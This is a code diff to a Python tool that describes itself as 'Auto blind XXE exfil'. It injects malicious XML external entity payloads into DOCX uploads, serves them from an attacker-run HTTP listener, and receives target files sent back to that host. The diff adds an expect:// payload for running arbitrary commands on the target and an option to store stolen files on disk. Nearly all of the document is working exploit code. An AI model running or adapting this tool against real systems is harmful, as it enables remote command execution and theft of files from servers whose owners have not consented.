@@ -15,9 +15,11 @@ import base64
 import bz2
 import shlex
 import time
+import os.path
 
 PPATH = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
-LFI_PATH = ''
+LFI_PATH = None
+STORE_PATH = None
 
 class InterceptorHttp(http.server.SimpleHTTPRequestHandler):
     LS_EVIL_XML = """<!ENTITY % file SYSTEM "php://filter/bzip2.compress/convert.base64-encode/resource={}">
@@ -26,25 +28,32 @@ class InterceptorHttp(http.server.SimpleHTTPRequestHandler):
     HTTP_EVIL_XML = """<!ENTITY % file SYSTEM "{}">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{}:{}/{}/handle?%file;'>">
 """
+    EXEC_EVIL_XML = """<!ENTITY % file SYSTEM "expect://{}">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{}:{}/{}/handle?%file;'>">
+"""
 
     def log_message(self, format, *args):
         pass
 
     def do_GET(self):
+        cmd = None
+        if LFI_PATH is not None and len(LFI_PATH) > 0:
+            cmd = shlex.split(LFI_PATH)
         if self.path == "/":
             pass
         elif self.path == "/{}/evil.xml".format(PPATH):
-            if LFI_PATH is not None and len(LFI_PATH) > 0:
-                cmd = shlex.split(LFI_PATH)
-                EVIL_XML = None
+            EVIL_XML = None
+            if cmd is not None:
                 if cmd[0] == "cat":
                     EVIL_XML = self.__class__.LS_EVIL_XML.format(cmd[1], self.server.evil['addr'], self.server.evil['port'], PPATH)
                 elif cmd[0] == "http":
                     EVIL_XML = self.__class__.HTTP_EVIL_XML.format(cmd[1], self.server.evil['addr'], self.server.evil['port'], PPATH)
+                else:
+                    EVIL_XML = self.__class__.EXEC_EVIL_XML.format(LFI_PATH, self.server.evil['addr'], self.server.evil['port'], PPATH)
 
-                if EVIL_XML == None:
-                    print("Unknown command: '{}'".format(cmd[0]))
-                    return
+            if EVIL_XML == None:
+                print("Unknown command: '{}'".format(cmd[0] if cmd is not None else cmd))
+                return
 
             self.send_response(200)
             self.send_header('Content-Type', 'text/xml')
@@ -54,7 +63,21 @@ class InterceptorHttp(http.server.SimpleHTTPRequestHandler):
             self.send_response(200)
             self.end_headers()
             try:
-                print(bz2.decompress(base64.b64decode(self.path.split('?')[1])).decode('utf-8'))
+                content = bz2.decompress(base64.b64decode(self.path.split('?')[1]))
+                print(content.decode('utf-8'))
+                if cmd[0] == "cat" and STORE_PATH is not None:
+                    tpath = pathlib.PurePath(cmd[1])
+                    if tpath.is_absolute():
+                        tpath = tpath.relative_to(tpath.root)
+                    fpath = STORE_PATH / tpath
+                    if cmd[1].strip()[-1] == os.sep:
+                        print("creating dir '{}'".format(fpath))
+                        fpath.mkdir(parents=True, exist_ok=True)
+                    else:
+                        fpath.parents[0].mkdir(parents=True, exist_ok=True)
+                        print('storing in "{}"'.format(fpath))
+                        with open(fpath, "wb") as f:
+                            f.write(content)
             except:
                 import traceback
                 traceback.print_exc()
@@ -109,19 +132,19 @@ def run_server(reverse_listen, listen, port):
         }
         httpd.serve_forever()
 
-def set_next_cmd(paths_file):
-    global LFI_PATH
-    LFI_PATH = ''
+def get_next_cmd(paths_file, suffixes):
+    pathes = []
     if paths_file is not None:
-        LFI_PATH = paths_file.readline()
-        if len(LFI_PATH.strip()) > 0:
-            LFI_PATH = "cat {}".format(LFI_PATH.decode("utf-8").strip())
-            print(LFI_PATH)
-    if len(LFI_PATH) == 0:
-        LFI_PATH = input("$> ")
+        pathes = [paths_file.readline()]
+        if len(pathes[0].strip()) > 0:
+            pathes = ["cat {}{}".format(pathes[0].decode("utf-8").strip(), suffix) for suffix in suffixes]
+    if len(pathes[0]) == 0:
+        pathes = [input("$> ")]
+    return pathes
 
 def main(args):
     global LFI_PATH
+    global STORE_PATH
     from threading import Thread
 
     parser = argparse.ArgumentParser(description='Auto blind XXE exfil')
@@ -135,6 +158,7 @@ def main(args):
     parser.add_argument('-D', '--data', type=str, required=False)
     parser.add_argument('-P', '--path', type=str, help='path to extract')
     parser.add_argument('--paths-file', type=str, help='pathes to extract')
+    parser.add_argument('--store', type=str, required=False, help='extract all found files in specified folder. WARNING: relative paths will be hella annoying')
 
     args = parser.parse_args(args[1:])
 
@@ -144,7 +168,12 @@ def main(args):
     else:
         url = url_serve
 
-    LFI_PATH = args.path
+    if args.store is not None:
+        STORE_PATH = pathlib.Path(os.path.realpath(args.store))
+        STORE_PATH.mkdir(parents=True, exist_ok=True)
+
+    if args.path is not None:
+        LFI_PATH = args.path
     with tempfile.TemporaryDirectory() as tmpdirname:
         if args.template is not None:
             print("Infecting {}".format(args.template))
@@ -163,11 +192,13 @@ def main(args):
             while c is True:
                 if pt is not None:
                     pt.join()
-                if f is not None:
-                    time.sleep(0.3)
-                set_next_cmd(f)
-                pt = Thread(target=post_docx, args=[docx_path, args.url, args.data, args.header])
-                pt.start()
+                for cmd in get_next_cmd(f, ['/', '']):
+                    if f is not None:
+                        time.sleep(0.3)
+                    LFI_PATH = cmd
+                    print("$> {}".format(LFI_PATH))
+                    pt = Thread(target=post_docx, args=[docx_path, args.url, args.data, args.header])
+                    pt.start()
             st.join()
         except KeyboardInterrupt:
             print("Interrupted via CTRL+C")
